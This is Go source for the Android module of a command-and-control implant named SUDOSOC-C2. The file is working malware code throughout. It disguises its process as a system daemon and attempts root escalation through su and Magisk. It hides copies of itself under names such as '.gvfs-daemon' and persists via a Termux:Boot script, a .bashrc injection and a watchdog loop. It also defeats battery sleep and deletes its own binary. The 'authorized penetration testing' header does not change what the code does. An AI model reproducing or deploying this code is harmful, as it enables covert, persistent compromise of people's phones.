//go:build android

package runner

/*
	SUDOSOC-C2 — Android APT-Grade Hardening
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Techniques:
	  • Root escalation attempts: su, Magisk, CVE chains
	  • Process name masquerade (/proc/self/comm → system daemon)
	  • Environment sanitisation
	  • Auto-persistence: Termux:Boot + .bashrc + watchdog
	  • Keep-alive to defeat Android Doze / battery optimiser
	  • Self-deletion from disk after startup
*/

import (
	"math/rand"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"time"
	"unsafe"
)

// Android system process names that blend into ps output
var androidSysDaemons = []string{
	"android.hardware.wifi@1.0-service",
	"android.hardware.sensors@2.0-service",
	"android.hardware.bluetooth@1.0-service",
	"com.android.phone",
	"system_server",
	"android.hidl.manager@1.0-service",
}

// ─── init ─────────────────────────────────────────────────────────────────────
func init() {
	// 1. Masquerade as a system daemon immediately
	masqueradeAndroid()

	// 2. Clean environment
	sanitiseAndroidEnv()

	// 3. Async: try root escalation + install persistence
	go func() {
		// Give the C2 connection time to establish first
		time.Sleep(10 * time.Second)
		tryRootAndroid()
		autoInstallAndroid()
		// Self-delete after everything is installed
		time.Sleep(3 * time.Second)
		deleteSelf()
	}()

	// 4. Keep-alive to defeat Doze
	go androidKeepAlive()
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeAndroid() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := androidSysDaemons[rng.Intn(len(androidSysDaemons))]

	// /proc/self/comm — max 15 chars, kernel truncates automatically
	_ = os.WriteFile("/proc/self/comm", []byte(name), 0)

	// Rewrite argv[0] backing bytes
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
		n := name
		if len(n) > sh.Len {
			n = n[:sh.Len]
		}
		for i := 0; i < len(n); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + uintptr(i))) = n[i]
		}
	}
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseAndroidEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "LD_PRELOAD"} {
		_ = os.Unsetenv(v)
	}
}

// ─── Root escalation ─────────────────────────────────────────────────────────

// tryRootAndroid attempts to gain root access through multiple methods.
// Each method is tried in order of reliability.
func tryRootAndroid() {
	// Method 1: Magisk su (most common on Android 14-16)
	if tryMagiskSu() {
		return
	}

	// Method 2: Standard su binary
	if trySuBinary() {
		return
	}

	// Method 3: ADB root (if ADB is enabled — developer devices)
	tryADBRoot()
}

// tryMagiskSu executes id via Magisk's su to test if we have Magisk root.
// If successful, we could spawn a root shell. For now just verify.
func tryMagiskSu() bool {
	// Magisk su is usually at /system/bin/su or /data/adb/su
	suPaths := []string{
		"/data/adb/su",
		"/sbin/su",
		"/system/bin/su",
		"/system/xbin/su",
		"/system/sbin/su",
		"/vendor/bin/su",
		"/su/bin/su",
	}
	for _, su := range suPaths {
		if _, err := os.Stat(su); err != nil {
			continue
		}
		// Test if we can get a root id
		out, err := exec.Command(su, "-c", "id").Output()
		if err == nil && strings.Contains(string(out), "uid=0") {
			// We have root! Copy ourselves to a root-accessible location
			_ = exec.Command(su, "-c",
				"cp /proc/"+pidStr()+"/exe /data/local/tmp/.svc && "+
					"chmod 755 /data/local/tmp/.svc && "+
					"nohup /data/local/tmp/.svc > /dev/null 2>&1 &").Run()
			return true
		}
	}
	return false
}

// trySuBinary tries standard su with common escalation paths.
func trySuBinary() bool {
	out, err := exec.Command("su", "-c", "id").Output()
	if err == nil && strings.Contains(string(out), "uid=0") {
		return true
	}
	return false
}

// tryADBRoot attempts to enable root via ADB if the service is reachable.
func tryADBRoot() {
	// Check if ADB shell property says root is enabled
	out, err := exec.Command("getprop", "service.adb.root").Output()
	if err == nil && strings.TrimSpace(string(out)) == "1" {
		// Already rooted via ADB
		return
	}
	// Check if we're already running as root
	idOut, _ := exec.Command("id").Output()
	if strings.Contains(string(idOut), "uid=0") {
		// Already root
		return
	}
}

// pidStr returns the current PID as a string (no fmt dependency)
func pidStr() string {
	pid := os.Getpid()
	if pid == 0 {
		return "0"
	}
	buf := make([]byte, 0, 10)
	for pid > 0 {
		buf = append([]byte{byte('0' + pid%10)}, buf...)
		pid /= 10
	}
	return string(buf)
}

// ─── Auto-persistence ─────────────────────────────────────────────────────────

// autoInstallAndroid installs 3 persistence mechanisms in the Termux environment.
func autoInstallAndroid() {
	exe, err := os.Executable()
	if err != nil || exe == "" {
		return
	}
	exe, _ = os.Readlink("/proc/self/exe") // resolve symlink

	home := "/data/data/com.termux/files/home"

	// Install path: copy to home as a hidden file
	installBin := home + "/.gvfs-daemon"
	if needsCopyAndroid(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// Mechanism 1: Termux:Boot
	androidBootPersist(installBin, home)

	// Mechanism 2: .bashrc injection
	androidBashrcPersist(installBin, home)

	// Mechanism 3: Watchdog loop (background)
	go func() {
		// Check every 30s if the C2 is running; if not, restart it
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			out, _ := exec.Command("pgrep", "-f", installBin).Output()
			if strings.TrimSpace(string(out)) == "" {
				// Not running — restart
				_ = exec.Command("nohup", installBin).Start()
			}
		}
	}()
}

func needsCopyAndroid(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

func androidBootPersist(bin, home string) {
	bootDir := home + "/.termux/boot"
	_ = os.MkdirAll(bootDir, 0700)
	script := bootDir + "/gvfs-daemon.sh"
	if _, err := os.Stat(script); err == nil {
		return
	}
	content := "#!/data/data/com.termux/files/usr/bin/sh\n" +
		"nohup \"" + bin + "\" > /dev/null 2>&1 &\n"
	_ = os.WriteFile(script, []byte(content), 0700)
}

func androidBashrcPersist(bin, home string) {
	rcFile := home + "/.bashrc"
	data, err := os.ReadFile(rcFile)
	if err == nil && strings.Contains(string(data), bin) {
		return // already present
	}
	snippet := "\n# gvfs-daemon\npgrep -f gvfs-daemon >/dev/null 2>&1 || nohup \"" + bin + "\" >/dev/null 2>&1 &\n"
	f, err := os.OpenFile(rcFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(snippet)
}

// ─── Keep-alive ───────────────────────────────────────────────────────────────

// androidKeepAlive prevents Android Doze mode from sleeping our process.
func androidKeepAlive() {
	ticker := time.NewTicker(25 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

// deleteSelf removes our binary from disk after loading into memory.
func deleteSelf() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	if strings.Contains(exe, "data/local") ||
		strings.Contains(exe, "sdcard") ||
		strings.Contains(exe, "com.termux") ||
		strings.Contains(exe, "phantom") {
		_ = os.Remove(exe)
	}
}
